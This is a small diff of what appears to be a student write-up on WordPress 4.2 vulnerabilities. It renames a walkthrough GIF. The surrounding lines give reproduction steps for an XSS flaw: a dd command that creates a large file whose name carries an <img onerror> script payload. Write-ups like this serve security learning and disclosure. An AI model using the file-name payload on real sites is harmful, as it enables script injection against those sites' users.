@@ -12,7 +12,7 @@ Time spent: **5** hours spent in total
     - Tested in version: 4.2
     - Fixed in version:
   - [X] GIF Walkthrough:
-  ![](xss-file-too-big.gif)
+  ![](xss-file-too-large.gif)
   - [X] Steps to recreate:
   ```
   a. dd if=/dev/zero of='something<img src=a onerror=(alert('pwned'))>.png' count=1024 bs=10000 to create a large file with the script exploit.
